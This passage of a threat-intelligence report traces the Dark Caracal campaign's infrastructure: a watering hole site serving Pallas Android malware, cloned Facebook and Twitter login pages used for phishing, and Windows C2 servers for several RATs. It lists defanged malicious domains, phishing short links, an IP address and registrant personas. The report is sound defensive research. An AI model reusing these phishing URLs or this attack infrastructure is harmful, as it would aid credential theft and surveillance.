The adobeair[.]net server has, as of late September 2017, been moved to a new hosting provider, M247, and the operators have 
improved the security. 

WHOIS history for adobeair[.]net lists Nancy Razzouk with an email address of op13@mail[.]com as the registrant. We have identified 
the “Nancy Razzouk” persona as the SSL signer of the Windows malware samples and the registrant of multiple domains. Its reuse 
has helped identify further Dark Caracal infrastructure.

SECURITY RESEARCH REPORTWatering Hole Server

During this investigation, we determined this server is the only infrastructure we discovered that serves up malicious apps 
belonging to the Pallas malware family. A detailed analysis of these applications can be found under the Android Surveillanceware 
section. As with other Dark Caracal infrastructure, the secureandroid[.]info domain was also registered with the bulletproof hosting 
company Shinjiru.

We found links to these landing pages in the exfiltrated content of compromised devices, which indicates it is actively being used 
during the attack chain. As of December 2017 it appears that secureandroid[.]info has had its domain expire.

Figure 29: Screenshot of the secureandroid[.]info watering hole server, a 
distribution point for Pallas

Phishing Domains

We identified the Dark Caracal domain tweetsfb[.]com while analyzing the secureandroid[.]info server source code. We identified 
two bit[.]ly URLs on this server that resolve to other pages on the tweetsfb site that were carefully crafted to look like the Facebook 
and Twitter login portals. The copyright dates suggest these pages are clones of the originals from 2015. 

 

Figure 30: Dark Caracal clones of Twitter and Facebook login portals

  41

SECURITY RESEARCH REPORTThese bit[.]ly links and their respective resolving links are:

•  http://bit[.]ly/2j3r285 points to  

http://www.tweetsfb[.]com/services/100001472583690/twitter/articles/100001/

•  http://bit[.]ly/2iByHcu points to  

http://tweetsfb[.]com/services/100001472583690/facebook/groups/100002/

The tweetsfb[.]com domain was found to share an IP address (172.94.17.147) with the following additional domains.

Figure 31: Domains sharing the same IP address as tweetsfb[.]com

We were able to find additional phishing campaigns in VirusTotal that referenced fbarticles[.]com. While fbarticles was registered 
by the op13@mail[.]com address with the name “Hadi Mazeh,” the WHOIS information for fbtweets was private.

Figure 32: Detections in VirusTotal for fbarticles[.]com

  42

SECURITY RESEARCH REPORTFigure 33: Detections in VirusTotal for the IP address that hosted fbarticles[.]com

Note: we identified three further domains — “facebookservices[.]org”, “gmailservices[.]org”, and “twiterservices[.]org” that were 
once a part of this campaign. Those domains now appear to be sinkholed.

When we discovered these domains, the threat actors had already taken them offline and another individual had purchased 
them. This individual is associated with unrelated domains that are connected to other APT reports. However, we noticed that 
the individual purchased the domains after the APT reports went public. While we’re not sure why this individual is purchasing, 
sinkholing, and monitoring these domains, we think it’s an interesting note. 

  43

SECURITY RESEARCH REPORTWindows C2 Servers 

The Windows server infrastructure has a much longer history than the Android infrastructure, showing that the actors are willing 
to evolve to new technologies, such as mobile, as they become more valuable targets. 

The Windows malware servers hosted control panels for multiple campaigns using various malware that included IRIS 
RAT, Bandook, and Arcom RAT. We found these servers hosting exfiltrated desktop content, Windows malware signed by 
“alecouperus@mail[.]com”, and the CrossRAT trojan.

All of these domains share the same IP on more than one occasion and have migrated between hosting providers in the same 
time window. Most of these domains were hosted on Shinjiru, the same hosting server for the Android campaign.

  44

SECURITY RESEARCH REPORTUsing the Wayback Machine we identified the signature Win32 apache server running on skypeupdate[.]com in 2016. This server 
was first seen resolving to an IP belonging to Shinjiru in late 2013 and last seen resolving to a Shinjiru IP in late 2016.

The oldest domain we identified as part of this infrastructure is flexberry[.]com. The following screenshot shows passive DNS 
resolution dating back to 2010.
